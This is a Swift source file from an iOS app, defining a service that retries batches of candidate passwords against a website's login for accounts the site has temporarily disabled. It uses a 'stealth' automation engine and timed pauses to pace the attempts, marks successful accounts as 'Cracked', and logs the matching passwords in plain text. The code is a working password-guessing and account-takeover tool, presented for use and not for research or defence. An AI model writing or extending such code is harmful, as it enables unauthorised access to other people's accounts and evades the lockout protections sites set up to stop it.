import Foundation
import Observation
import UIKit

@Observable
@MainActor
class TempDisabledCheckService {
    static let shared = TempDisabledCheckService()

    static let bgTaskIdentifier = "app.rork.dual-mode-carcheck-app.tempdisabled"

    var isRunning: Bool = false
    var lastRunDate: Date?
    var backgroundCheckEnabled: Bool = false {
        didSet {
            UserDefaults.standard.set(backgroundCheckEnabled, forKey: "tempDisabledBgCheckEnabled")
        }
    }
    var checkLogs: [PPSRLogEntry] = []

    private let engine = LoginAutomationEngine()
    private var checkTask: Task<Void, Never>?

    init() {
        let saved = UserDefaults.standard.bool(forKey: "tempDisabledBgCheckEnabled")
        backgroundCheckEnabled = saved
        if let ts = UserDefaults.standard.object(forKey: "tempDisabledLastRun") as? TimeInterval {
            lastRunDate = Date(timeIntervalSince1970: ts)
        }
    }

    func runPasswordCheck(credentials: [LoginCredential], getURL: @escaping () -> URL, persistCredentials: @escaping () -> Void, onLog: @escaping (String, PPSRLogEntry.Level) -> Void) {
        guard !isRunning else { return }

        let tempDisabled = credentials.filter { $0.status == .tempDisabled && !$0.assignedPasswords.isEmpty && $0.nextPasswordIndex < $0.assignedPasswords.count }
        guard !tempDisabled.isEmpty else {
            onLog("No temp disabled accounts with untested passwords", .warning)
            return
        }

        isRunning = true
        onLog("Starting temp disabled password check: \(tempDisabled.count) accounts", .info)

        checkTask = Task {
            engine.debugMode = false
            engine.stealthEnabled = true

            for cred in tempDisabled {
                let batch = cred.getNextPasswordBatch(count: 3)
                guard !batch.isEmpty else { continue }

                onLog("Testing \(batch.count) passwords for \(cred.username)", .info)
                addLog("Testing \(batch.count) passwords for \(cred.username)")

                for pw in batch {
                    let testCred = LoginCredential(username: cred.username, password: pw)
                    let attempt = LoginAttempt(credential: testCred, sessionIndex: 1)
                    let testURL = getURL()

                    let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: TimeoutResolver.resolveAutomationTimeout(45))

                    switch outcome {
                    case .success:
                        cred.status = .working
                        cred.notes = "Cracked via temp disabled check with password: \(pw)"
                        onLog("\(cred.username) — SUCCESS with password: \(pw)", .success)
                        addLog("SUCCESS: \(cred.username) with \(pw)")
                        cred.recordResult(success: true, duration: attempt.duration ?? 0, detail: "temp disabled password match")
                        persistCredentials()
                        break

                    case .permDisabled:
                        cred.status = .permDisabled
                        onLog("\(cred.username) — now permanently disabled", .error)
                        addLog("PERM DISABLED: \(cred.username)")
                        persistCredentials()
                        break

                    case .noAcc:
                        onLog("\(cred.username) — password '\(pw)' rejected (no acc)", .warning)
                        addLog("NO ACC: \(cred.username) with \(pw)")

                    default:
                        onLog("\(cred.username) — password '\(pw)' result: \(String(describing: outcome))", .warning)
                        addLog("UNSURE: \(cred.username) with \(pw)")
                    }

                    if cred.status == .working || cred.status == .permDisabled {
                        break
                    }

                    try? await Task.sleep(for: .seconds(2))
                }

                if cred.status == .tempDisabled {
                    cred.advancePasswordIndex(by: batch.count)
                    persistCredentials()
                }

                try? await Task.sleep(for: .seconds(3))
            }

            lastRunDate = Date()
            if let runDate = lastRunDate {
                UserDefaults.standard.set(runDate.timeIntervalSince1970, forKey: "tempDisabledLastRun")
            }
            isRunning = false
            onLog("Temp disabled password check complete", .success)
            addLog("Check complete")

            if backgroundCheckEnabled {
                scheduleNextBackgroundCheck()
            }
        }
    }

    func stopCheck() {
        checkTask?.cancel()
        checkTask = nil
        isRunning = false
        addLog("Check stopped by user")
    }

    func scheduleNextBackgroundCheck() {
        addLog("Background check scheduling requested")
    }

    var timeSinceLastRun: String {
        guard let last = lastRunDate else { return "Never" }
        let interval = Date().timeIntervalSince(last)
        if interval < 60 { return "Just now" }
        if interval < 3600 { return "\(Int(interval / 60))m ago" }
        return "\(Int(interval / 3600))h ago"
    }

    private func addLog(_ message: String) {
        checkLogs.insert(PPSRLogEntry(message: message, level: .info), at: 0)
        if checkLogs.count > 100 {
            checkLogs = Array(checkLogs.prefix(100))
        }
    }
}
